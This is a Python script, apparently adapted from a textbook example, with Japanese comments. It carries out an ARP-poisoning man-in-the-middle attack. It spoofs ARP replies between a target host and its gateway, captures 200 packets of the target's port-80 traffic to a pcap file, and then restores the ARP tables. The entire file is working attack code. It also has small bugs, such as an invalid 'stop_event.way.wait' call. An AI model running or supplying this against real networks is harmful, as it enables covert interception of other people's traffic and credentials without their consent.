from scapy.all import *



def get_mac(ip_address):
	responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
	for s, r in responses:
		return r[Ether].src
	return None

# 偽のARPテーブル作成
def poison_target(gateway_ip,gateway_mac,target_ip,target_mac,stop_event):
	poison_target = ARP()
	poison_target.op = 2
	poison_target.psrc = gateway_ip
	poison_target.pdst = target_ip
	poison_target.hwdst = target_mac

	poison_gateway = ARP()
	poison_gateway.op = 2
	poison_gateway.psrc = target_ip
	poison_gateway.pdst = gateway_ip
	poison_gateway.hwdst = gateway_mac

	print("ARPポイゾニング開始.[CTRL-C to stop]")

	while True:
		send(poison_target)
		send(poison_gateway)
		if stop_event.way.wait(2):
			break

	print('ARPポイゾニング攻撃終了')

	return

#arpテーブルリセット
def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
	print('Restoring target...')

	send(ARP(op=2,psrc=gateway_ip,pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac),count=5)

	send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=target_mac),count=5)

def main():
	target_ip = input('対象IP:')
	host_ip = input('hostIP:')
	gateway_ip = input('GatewayIP:')
	interface = 'en0'

	packet_count = 200
	conf.iface = interface
	conf.verb = 0

	print('setting up{}',interface)

	gateway_mac = get_mac(gateway_ip)

	if not gateway_mac:
		print('gatewayのマックアドレスを取得するのに失敗')
		sys.exit(1)

	else:
		print('Gateway{} is at {}'.format(gateway_ip,gateway_mac))

	target_mac = get_mac(target_ip)

	if not target_mac:
		print('ターゲットのmacアドレス取得失敗')
		sys.exit(1)

	else:
		print('Target {} is at {}'.format(target_ip,target_mac))

	stop_event = threading.Event()
	poison_thread = threading.Thread(target=poison_target,args=[gateway_ip,gateway_mac,target_ip,target_mac,stop_event])

	poison_thread.start()

	print("[*] starting sniffer for {} packets".format(packet_count))
 
	bpf_filter = "ip host {} and tcp port 80".format(target_ip)
	packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
 
	wrpcap('arper.pcap', packets)
 
	stop_event.set()
	poison_thread.join()
 
	restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
 
if __name__ == '__main__':
	main()

